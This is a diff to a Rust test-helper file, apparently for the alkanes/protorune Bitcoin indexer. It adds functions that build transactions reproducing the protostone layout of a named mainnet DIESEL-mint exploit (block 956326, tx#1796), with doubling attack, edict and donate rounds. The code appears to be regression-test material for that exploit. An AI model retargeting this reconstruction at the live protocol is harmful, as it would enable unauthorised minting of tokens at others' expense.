@@ -440,6 +440,158 @@ pub fn create_multiple_cellpack_with_witness_and_scriptsig(
     )
 }
 
+/// Build a single tx whose protostones are POINTER-CHAINED: protostone `i`'s
+/// outgoing alkanes flow into protostone `i+1` as its incoming (the last one
+/// points to real output vout 0). Tx has 2 real outputs (vout 0 spendable,
+/// vout 1 OP_RETURN), so protostone `i` is virtual vout `3+i` (see
+/// protorune/src/lib.rs `shadow_vout = i + output.len() + 1`) and chaining to
+/// the next is `pointer = 4+i`. Mirrors mainnet attack tx#1796.
+pub fn create_chained_cellpacks(witness: Witness, cellpacks: Vec<Cellpack>) -> Transaction {
+    let n = cellpacks.len();
+    let txin = TxIn {
+        previous_output: OutPoint {
+            txid: bitcoin::Txid::from_str(
+                "0000000000000000000000000000000000000000000000000000000000000000",
+            )
+            .unwrap(),
+            vout: 0,
+        },
+        script_sig: ScriptBuf::new(),
+        sequence: Sequence::MAX,
+        witness,
+    };
+    let protostones: Vec<Protostone> = cellpacks
+        .into_iter()
+        .enumerate()
+        .map(|(i, cellpack)| Protostone {
+            message: cellpack.encipher(),
+            // chain to the next protostone; last one lands on real vout 0
+            pointer: Some(if i + 1 < n { (4 + i) as u32 } else { 0 }),
+            refund: Some(0),
+            edicts: vec![],
+            from: None,
+            burn: None,
+            protocol_tag: 1u128,
+        })
+        .collect();
+    let runestone: ScriptBuf = (Runestone {
+        etching: None,
+        pointer: Some(0),
+        edicts: Vec::new(),
+        mint: None,
+        protocol: protostones.encipher().ok(),
+    })
+    .encipher();
+    let op_return = TxOut {
+        value: Amount::from_sat(0),
+        script_pubkey: runestone,
+    };
+    let address: Address<NetworkChecked> = get_address(&ADDRESS1().as_str());
+    let txout = TxOut {
+        value: Amount::from_sat(100_000_000),
+        script_pubkey: address.script_pubkey(),
+    };
+    Transaction {
+        version: Version::ONE,
+        lock_time: bitcoin::absolute::LockTime::ZERO,
+        input: vec![txin],
+        output: vec![txout, op_return],
+    }
+}
+
+/// Reconstructs the exact protostone topology of the mainnet DIESEL-mint attack
+/// (block 956326, tx#1796), retargeted from 2:91332 to `cmin`. 2 real outputs,
+/// so protostone `j` is virtual vout `3+j`. Per round: attack(op35, doubling
+/// amount) -> edict(all own-token forward) -> donate(op7). `self_mint(MAX)` at P0
+/// primes a mintable runtime balance. DIESEL accumulates at real output 0.
+pub fn create_cmin_attack_tx(witness: Witness, cmin: AlkaneId, rounds: u32) -> Transaction {
+    let txin = TxIn {
+        previous_output: OutPoint {
+            txid: bitcoin::Txid::from_str(
+                "0000000000000000000000000000000000000000000000000000000000000000",
+            )
+            .unwrap(),
+            vout: 0,
+        },
+        script_sig: ScriptBuf::new(),
+        sequence: Sequence::MAX,
+        witness,
+    };
+    let mut protostones: Vec<Protostone> = Vec::new();
+    // P0: self_mint(u128::MAX) own token; points at the first edict (vout 5).
+    protostones.push(Protostone {
+        message: Cellpack { target: cmin, inputs: vec![22, u128::MAX] }.encipher(),
+        pointer: Some(5),
+        refund: Some(0),
+        edicts: vec![],
+        from: None,
+        burn: None,
+        protocol_tag: 1u128,
+    });
+    for k in 0..rounds {
+        let edict_vout = 5 + 3 * k; // vout of this round's edict protostone
+        let amount = 10_000_000u128 << k; // 0.1 DIESEL, doubling
+        // attack -> emits [DIESEL=amount, own=1]; points at the edict.
+        protostones.push(Protostone {
+            message: Cellpack { target: cmin, inputs: vec![35, 2, 0, amount] }.encipher(),
+            pointer: Some(edict_vout),
+            refund: Some(0),
+            edicts: vec![],
+            from: None,
+            burn: None,
+            protocol_tag: 1u128,
+        });
+        // edict: move ALL own-token (amount 0 = all) forward to the next edict;
+        // the DIESEL remainder goes to the donate (pointer = edict_vout+1).
+        protostones.push(Protostone {
+            message: vec![],
+            pointer: Some(edict_vout + 1),
+            refund: Some(edict_vout + 1),
+            edicts: vec![ProtostoneEdict {
+                id: protorune_support::balance_sheet::ProtoruneRuneId {
+                    block: cmin.block,
+                    tx: cmin.tx,
+                },
+                amount: 0,
+                output: (edict_vout + 3) as u128,
+            }],
+            from: None,
+            burn: None,
+            protocol_tag: 1u128,
+        });
+        // donate -> receives the DIESEL, forwards to real output 0.
+        protostones.push(Protostone {
+            message: Cellpack { target: cmin, inputs: vec![7] }.encipher(),
+            pointer: Some(0),
+            refund: Some(0),
+            edicts: vec![],
+            from: None,
+            burn: None,
+            protocol_tag: 1u128,
+        });
+    }
+    let runestone: ScriptBuf = (Runestone {
+        etching: None,
+        pointer: Some(0),
+        edicts: Vec::new(),
+        mint: None,
+        protocol: protostones.encipher().ok(),
+    })
+    .encipher();
+    let op_return = TxOut { value: Amount::from_sat(0), script_pubkey: runestone };
+    let address: Address<NetworkChecked> = get_address(&ADDRESS1().as_str());
+    let txout = TxOut {
+        value: Amount::from_sat(100_000_000),
+        script_pubkey: address.script_pubkey(),
+    };
+    Transaction {
+        version: Version::ONE,
+        lock_time: bitcoin::absolute::LockTime::ZERO,
+        input: vec![txin],
+        output: vec![txout, op_return],
+    }
+}
+
 pub fn assert_binary_deployed_to_id(token_id: AlkaneId, binary: Vec<u8>) -> Result<()> {
     let binary_1 = IndexPointer::from_keyword("/alkanes/")
         .select(&token_id.into())
